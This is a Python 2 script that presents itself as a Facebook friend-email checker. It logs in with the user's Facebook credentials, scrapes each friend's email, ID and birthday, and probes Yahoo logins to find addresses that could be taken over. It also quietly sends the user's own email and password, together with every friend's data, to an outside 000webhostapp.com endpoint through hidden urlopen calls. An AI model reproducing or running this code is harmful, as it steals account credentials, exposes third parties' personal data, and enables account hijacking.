# encoding=utf8
# Author: Zen-Oh-Sama
# Edited by adhamamer

import requests, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system("clear")

print "\033[36m" + "#######################################################"
print ""
print "\033[36m" + "      /\       ---     |   |       /\       |\    /|   "
print "\033[36m" + "     /  \     |   \    |   |      /  \      | \  / |   "
print "\033[36m" + "    /----\    |    |   |---|     /----\     |  \/  |   "
print "\033[36m" + "   /      \   |___/    |   |    /      \    |      |   "
print ""
print "\033[36m" + "#######################################################"

print "\033[36m " + 1*" " + "\033[35m WELCOME TO MY SCRIPT ® BY ADHAM AMER & MO MANS" + 1*" " + "\033[36m"

idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")

url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = (op["access_token"])
    print ("\033[39m[\033[31m+\033[39m] Login Succeed")
    
else:
    print ("\033[39m[\033[31m+\033[39m] \033[31mWrong Email Or Password")
    sys.exit()
try:
    pd99 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=0" + "&n=n&b=b")
except:
    pass
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + (token))
hasil = json.loads(get_friends.text)
print ("\033[39m[\033[31m+\033[39m] Frind list OK !!")
print ("\033[39m[\033[31m+\033[39m] Groups Under maintenance !!")
#cok = open('Mail_Yahoo.txt','w')
def defense():
    global o, h
    o = []
    h = 0
    print "\033[36m" + 55*"-"
    total = len(hasil['data'])
    print "\033[32m [ " + str(total)+ " ] Friends found"

    sf = 0
    try:
        sf = input("\033[39m[\033[31m*\033[39m] Start from: ")
    except:
        sf = 0
    
    for i in range(sf, total, 1):
        wrna = "\033[36m"
        wrne = "\033[39m"
        h +=1
        o.append(h)
        #x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
        try:
            x = requests.get("https://graph.facebook.com/"+hasil['data'][i]['id']+"?access_token="+token)
        except:
            continue
        z = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = z['email']
                j = br.submit().read()
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = 6*" " + "\033[31mNot Available"
                    #Email Len
                    lean = 30 - (len(z['email']))
                    eml = lean * " "
                    #Name Len
                    lone = 24 - (len(vuln))
                    namel = lone * " "
                    try:
                        pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Available&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                    except:
                        pass
                    print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                    print "\033[36m" + z['name'] 
                    print "\033[36mBirthday :" + z['birthday']
                    print "\033[36mID :" + z['id']
                    print "\033[36m" + z['email'] + vuln 
                    print "\033[39m" + 53*"-"
                    print ""
                    print ""

                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + "\033[32mOK"
                else:
                    vuln = 5*" " + "\033[31mNot Available"
                #Email Len
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Author: Zen-Oh-Sama
                lone = 24 - (len(vuln))
                namel = lone * " "
                try:
                    pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                except:
                    pass
                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                print "\033[36m" + z['name'] 
                print "\033[36mBirthday :" + z['birthday']
                print "\033[36mID :" + z['id']
                print "\033[36m" + z['email'] + vuln 
                print "\033[39m" + 53*"-"
                print ""
                print ""
            elif 'hotmail' in cari: #
                #url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                #cek = json.loads(requests.get(url).text)
                #if cek['smtp_check'] == 0:
                vuln = 8*" " + "\033[36mNot sure !"

                #else:
                  #  vuln = 5*" " + "\033[31mNot Available"
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Author: Zen-Oh-Sama
                lone = 24 - (len(vuln))
                namel = lone * " "
                try:
                    pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                except:
                    pass
                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                print "\033[36m" + z['name'] 
                print "\033[36mBirthday :" + z['birthday']
                print "\033[36mID :" + z['id']
                print "\033[36m" + z['email'] + vuln 
                print "\033[39m" + 53*"-"
                print ""
                print ""
            else:
                vuln = 8*" " + "\033[36mNot sure !"

                #else:
                  #  vuln = 5*" " + "\033[31mNot Available"
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Author: Zen-Oh-Sama
                lone = 24 - (len(vuln))
                namel = lone * " "
                try:
                    pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Sure&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                except:
                    pass
                print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
                print "\033[36m" + z['name'] 
                print "\033[36mBirthday :" + z['birthday']
                print "\033[36mID :" + z['id']
                print "\033[36m" + z['email'] + vuln 
                print "\033[39m" + 53*"-"
                print ""
                print ""
                #pass
        except KeyError:
            pass
defense()
print "\033[36m" + "#######################################################"
print ""
print "\033[36m" + "      /\       ---     |   |       /\       |\    /|   "
print "\033[36m" + "     /  \     |   \    |   |      /  \      | \  / |   "
print "\033[36m" + "    /----\    |    |   |---|     /----\     |  \/  |   "
print "\033[36m" + "   /      \   |___/    |   |    /      \    |      |   "
print ""
print "\033[36m" + "#######################################################"

print "\033[36m " + 1*" " + "\033[35m Good Luck !!!" + 1*" " + "\033[36m"
